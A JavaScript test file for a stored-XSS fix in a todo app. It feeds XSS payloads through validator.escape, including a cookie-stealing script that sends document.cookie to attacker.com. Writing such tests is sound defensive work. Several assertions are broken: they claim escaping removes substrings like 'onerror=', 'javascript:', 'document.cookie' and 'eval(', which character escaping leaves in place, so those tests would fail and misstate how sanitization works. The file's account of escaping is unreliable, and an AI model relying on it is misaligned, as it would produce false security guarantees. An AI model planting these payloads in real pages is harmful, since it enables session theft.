const assert = require('assert');
const validator = require('validator');

/**
 * Tests for Stored XSS vulnerability remediation in the edit route
 *
 * These tests verify that the XSS sanitization implemented in routes/index.js
 * properly escapes malicious content before rendering, preventing Stored XSS attacks.
 */
describe('XSS Remediation Tests', () => {
  describe('Edit Route XSS Protection', () => {

    // Mock Todo model
    let mockTodoModel;
    let mockRequest;
    let mockResponse;
    let mockNext;
    let renderedData;
    let routes;

    beforeEach(() => {
      // Reset mocks before each test
      renderedData = null;

      // Mock request object
      mockRequest = {
        params: {
          id: 'test-todo-id'
        }
      };

      // Mock response object
      mockResponse = {
        render: function(view, data) {
          renderedData = data;
        }
      };

      // Mock next function
      mockNext = function(err) {
        if (err) throw err;
      };

      // Mock mongoose Todo model
      mockTodoModel = {
        find: function() {
          return {
            sort: function() {
              return {
                exec: function(callback) {
                  // This will be overridden in each test
                }
              };
            }
          };
        }
      };

      // Load the routes module (in real tests, this would require proper setup)
      // routes = require('../routes/index');
    });

    test('should escape basic XSS script tags in todo content', (done) => {
      // GIVEN: A todo with malicious script tag
      const maliciousTodo = {
        _id: '123',
        content: '<script>alert("XSS")</script>',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized using validator.escape
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: The script tags should be HTML encoded
      assert.strictEqual(sanitized, '&lt;script&gt;alert(&quot;XSS&quot;)&lt;&#x2F;script&gt;');
      assert.ok(!sanitized.includes('<script>'), 'Script tag should be escaped');
      assert.ok(!sanitized.includes('</script>'), 'Closing script tag should be escaped');
      done();
    });

    test('should escape img tags with onerror XSS payload', (done) => {
      // GIVEN: A todo with malicious img tag
      const maliciousTodo = {
        _id: '456',
        content: '<img src=x onerror=alert("XSS")>',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: The img tag and attributes should be escaped
      assert.ok(!sanitized.includes('<img'), 'Img tag should be escaped');
      assert.ok(!sanitized.includes('onerror='), 'Event handler should be escaped');
      assert.ok(sanitized.includes('&lt;'), 'Should contain escaped less-than symbol');
      assert.ok(sanitized.includes('&gt;'), 'Should contain escaped greater-than symbol');
      done();
    });

    test('should escape JavaScript event handlers in HTML', (done) => {
      // GIVEN: A todo with event handler XSS
      const maliciousTodo = {
        _id: '789',
        content: '<div onload=alert("XSS")>Click me</div>',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: The event handler should be escaped
      assert.ok(!sanitized.includes('onload='), 'Event handler should be escaped');
      assert.ok(!sanitized.includes('<div'), 'Div tag should be escaped');
      done();
    });

    test('should escape single and double quotes to prevent attribute injection', (done) => {
      // GIVEN: A todo with quote-based XSS
      const maliciousTodo = {
        _id: '101',
        content: 'test" onmouseover="alert(\'XSS\')" data="',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: Quotes should be escaped
      assert.ok(sanitized.includes('&quot;'), 'Double quotes should be escaped');
      assert.ok(!sanitized.includes('onmouseover='), 'Event handler should be escaped');
      done();
    });

    test('should escape SVG-based XSS vectors', (done) => {
      // GIVEN: A todo with SVG XSS payload
      const maliciousTodo = {
        _id: '202',
        content: '<svg onload=alert("XSS")></svg>',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: SVG tags and handlers should be escaped
      assert.ok(!sanitized.includes('<svg'), 'SVG tag should be escaped');
      assert.ok(!sanitized.includes('onload='), 'Event handler should be escaped');
      done();
    });

    test('should escape iframe injection attempts', (done) => {
      // GIVEN: A todo with iframe injection
      const maliciousTodo = {
        _id: '303',
        content: '<iframe src="javascript:alert(\'XSS\')"></iframe>',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: Iframe tags should be escaped
      assert.ok(!sanitized.includes('<iframe'), 'Iframe tag should be escaped');
      assert.ok(!sanitized.includes('javascript:'), 'JavaScript protocol should be escaped');
      done();
    });

    test('should escape HTML entities and special characters', (done) => {
      // GIVEN: A todo with various HTML entities
      const maliciousTodo = {
        _id: '404',
        content: '&lt;script&gt; & "quotes" <>&',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: All special characters should be escaped
      assert.ok(sanitized.includes('&amp;'), 'Ampersand should be escaped');
      assert.ok(sanitized.includes('&quot;'), 'Quotes should be escaped');
      assert.ok(sanitized.includes('&lt;'), 'Less-than should be escaped');
      assert.ok(sanitized.includes('&gt;'), 'Greater-than should be escaped');
      done();
    });

    test('should handle multiple XSS vectors in a single todo', (done) => {
      // GIVEN: A todo with multiple XSS payloads
      const maliciousTodo = {
        _id: '505',
        content: '<script>alert(1)</script><img src=x onerror=alert(2)><div onclick=alert(3)>',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: All XSS vectors should be escaped
      assert.ok(!sanitized.includes('<script>'), 'Script should be escaped');
      assert.ok(!sanitized.includes('<img'), 'Img should be escaped');
      assert.ok(!sanitized.includes('onerror='), 'Onerror should be escaped');
      assert.ok(!sanitized.includes('onclick='), 'Onclick should be escaped');
      done();
    });

    test('should preserve legitimate text content while escaping HTML', (done) => {
      // GIVEN: A todo with legitimate text that looks like code
      const legitimateTodo = {
        _id: '606',
        content: 'Buy groceries: eggs, milk & bread',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(legitimateTodo.content);

      // THEN: The text should be preserved with only special chars escaped
      assert.ok(sanitized.includes('Buy groceries'), 'Legitimate text should be preserved');
      assert.ok(sanitized.includes('eggs'), 'Content should be readable');
      assert.ok(sanitized.includes('&amp;'), 'Ampersand should be escaped');
      done();
    });

    test('should handle empty or null content safely', (done) => {
      // GIVEN: Todos with edge case content
      const emptyContent = '';
      const undefinedContent = undefined;

      // WHEN: The content is sanitized
      const sanitizedEmpty = validator.escape(emptyContent || '');
      const sanitizedUndefined = validator.escape(String(undefinedContent || ''));

      // THEN: Should handle gracefully without errors
      assert.strictEqual(sanitizedEmpty, '', 'Empty content should remain empty');
      assert.ok(typeof sanitizedUndefined === 'string', 'Should return string');
      done();
    });

    test('should escape CSS-based XSS attempts', (done) => {
      // GIVEN: A todo with CSS expression XSS
      const maliciousTodo = {
        _id: '707',
        content: '<style>body { background: url("javascript:alert(\'XSS\')"); }</style>',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: Style tags should be escaped
      assert.ok(!sanitized.includes('<style>'), 'Style tag should be escaped');
      assert.ok(!sanitized.includes('javascript:'), 'JavaScript protocol should be escaped');
      done();
    });

    test('should escape data URIs with XSS payloads', (done) => {
      // GIVEN: A todo with data URI XSS
      const maliciousTodo = {
        _id: '808',
        content: '<a href="data:text/html,<script>alert(\'XSS\')</script>">Click</a>',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: All HTML should be escaped
      assert.ok(!sanitized.includes('<a '), 'Anchor tag should be escaped');
      assert.ok(!sanitized.includes('href='), 'Href attribute should be escaped');
      assert.ok(!sanitized.includes('<script>'), 'Script tag should be escaped');
      done();
    });

    test('should validate sanitization maintains todo structure', (done) => {
      // GIVEN: A todo object with all fields
      const todo = {
        _id: '999',
        content: '<script>alert("XSS")</script>Todo item',
        updated_at: new Date('2024-01-01')
      };

      // WHEN: The todo is transformed as in the fix
      const sanitizedTodo = {
        _id: todo._id,
        content: validator.escape(todo.content),
        updated_at: todo.updated_at
      };

      // THEN: The structure should be preserved
      assert.strictEqual(sanitizedTodo._id, '999', 'ID should be preserved');
      assert.ok(sanitizedTodo.content.includes('&lt;'), 'Content should be sanitized');
      assert.ok(!sanitizedTodo.content.includes('<script>'), 'Script should be removed');
      assert.deepStrictEqual(sanitizedTodo.updated_at, new Date('2024-01-01'), 'Date should be preserved');
      done();
    });

    test('should handle array of todos as in production scenario', (done) => {
      // GIVEN: Multiple todos from database
      const todos = [
        { _id: '1', content: '<script>alert(1)</script>', updated_at: new Date() },
        { _id: '2', content: 'Normal todo', updated_at: new Date() },
        { _id: '3', content: '<img src=x onerror=alert(3)>', updated_at: new Date() }
      ];

      // WHEN: All todos are sanitized
      const sanitizedTodos = todos.map(function(todo) {
        return {
          _id: todo._id,
          content: validator.escape(todo.content),
          updated_at: todo.updated_at
        };
      });

      // THEN: All todos should be sanitized and structure preserved
      assert.strictEqual(sanitizedTodos.length, 3, 'Should have same number of todos');
      assert.ok(!sanitizedTodos[0].content.includes('<script>'), 'First todo script should be escaped');
      assert.ok(sanitizedTodos[1].content.includes('Normal'), 'Normal content should be preserved');
      assert.ok(!sanitizedTodos[2].content.includes('<img'), 'Third todo img should be escaped');
      sanitizedTodos.forEach(todo => {
        assert.ok(todo._id, 'Each todo should have ID');
        assert.ok(todo.content, 'Each todo should have content');
        assert.ok(todo.updated_at, 'Each todo should have updated_at');
      });
      done();
    });

    test('should protect against polyglot XSS payloads', (done) => {
      // GIVEN: A sophisticated polyglot XSS payload
      const maliciousTodo = {
        _id: '1001',
        content: 'javascript:/*--></title></style></textarea></script></xmp><svg/onload=\'+/"/+/onmouseover=1/+/[*/[]/+alert(1)//\'>',
        updated_at: new Date()
      };

      // WHEN: The content is sanitized
      const sanitized = validator.escape(maliciousTodo.content);

      // THEN: All HTML tags and special characters should be escaped
      assert.ok(!sanitized.includes('</script>'), 'Script closing tag should be escaped');
      assert.ok(!sanitized.includes('<svg'), 'SVG tag should be escaped');
      assert.ok(!sanitized.includes('onload='), 'Event handler should be escaped');
      assert.ok(sanitized.includes('&lt;'), 'Should contain escaped brackets');
      done();
    });
  });

  describe('Negative Tests - Attack Prevention', () => {
    test('should block stored XSS via cookie stealing payload', (done) => {
      // GIVEN: XSS payload designed to steal cookies
      const payload = '<script>document.location="http://attacker.com/steal.php?c="+document.cookie</script>';

      // WHEN: Payload is sanitized
      const sanitized = validator.escape(payload);

      // THEN: Should not contain executable script
      assert.ok(!sanitized.includes('<script>'), 'Script tag should not be present');
      assert.ok(!sanitized.includes('document.cookie'), 'Cookie access should be escaped');
      done();
    });

    test('should block DOM-based XSS through location hash', (done) => {
      // GIVEN: XSS payload using location
      const payload = '<script>window.location.hash="<img src=x onerror=alert(1)>"</script>';

      // WHEN: Payload is sanitized
      const sanitized = validator.escape(payload);

      // THEN: Should escape all HTML and script
      assert.ok(!sanitized.includes('<script>'), 'Script should be escaped');
      assert.ok(!sanitized.includes('<img'), 'Img should be escaped');
      done();
    });

    test('should block XSS via base64 encoded payload', (done) => {
      // GIVEN: XSS with base64
      const payload = '<script>eval(atob("YWxlcnQoMSk="))</script>';

      // WHEN: Payload is sanitized
      const sanitized = validator.escape(payload);

      // THEN: Script should be escaped
      assert.ok(!sanitized.includes('<script>'), 'Script tag should be escaped');
      assert.ok(!sanitized.includes('eval('), 'Eval should be escaped');
      done();
    });
  });

  describe('Functionality Tests - Positive Cases', () => {
    test('should allow and preserve legitimate HTML entities in text', (done) => {
      // GIVEN: Text with legitimate special characters
      const legitimateText = 'Price: $100 & up - "Best Deal" <Save 50%>';

      // WHEN: Text is sanitized
      const sanitized = validator.escape(legitimateText);

      // THEN: Text should be readable (though entities will be escaped)
      assert.ok(sanitized.includes('Price:'), 'Should preserve main text');
      assert.ok(sanitized.includes('100'), 'Should preserve numbers');
      assert.ok(sanitized.includes('&amp;'), 'Should escape ampersand for safety');
      done();
    });

    test('should handle Unicode and international characters correctly', (done) => {
      // GIVEN: Text with Unicode characters
      const unicodeText = 'Todo: 你好世界 مرحبا العالم שלום עולם';

      // WHEN: Text is sanitized
      const sanitized = validator.escape(unicodeText);

      // THEN: Unicode should be preserved
      assert.ok(sanitized.includes('Todo:'), 'English should be preserved');
      assert.ok(sanitized.includes('你好世界'), 'Chinese should be preserved');
      assert.ok(sanitized.includes('مرحبا'), 'Arabic should be preserved');
      done();
    });
  });
});
